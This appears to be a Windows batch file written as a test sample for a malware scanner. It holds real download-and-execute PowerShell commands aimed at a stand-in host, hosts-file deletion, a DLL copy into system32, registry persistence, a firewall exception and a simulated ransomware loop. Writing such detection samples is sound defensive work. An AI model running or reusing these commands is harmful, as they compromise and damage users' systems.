@echo off
REM This is a highly suspicious batch file that should trigger multiple alerts

echo Starting malicious operations...

REM Suspicious commands
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'payload.exe'"
powershell -WindowStyle Hidden -Command "Invoke-Expression(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"

REM Suspicious file operations
del /f /q %SYSTEMROOT%\system32\drivers\etc\hosts
copy malicious.dll %SYSTEMROOT%\system32\

REM Suspicious registry operations
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousStartup" /t REG_SZ /d "%TEMP%\payload.exe" /f

REM Suspicious network operations
netsh firewall add allowedprogram "%TEMP%\payload.exe" "Malicious Program" ENABLE

REM Suspicious encryption operations
echo Encrypting user files...
for /r %USERPROFILE% %%f in (*.doc *.docx *.xls *.xlsx *.pdf) do (
    echo Encrypting %%f
    REM Simulated encryption
)

echo Malicious operations completed.
echo Your system has been compromised.

REM This file should be classified as "Quarantine" by the scanner
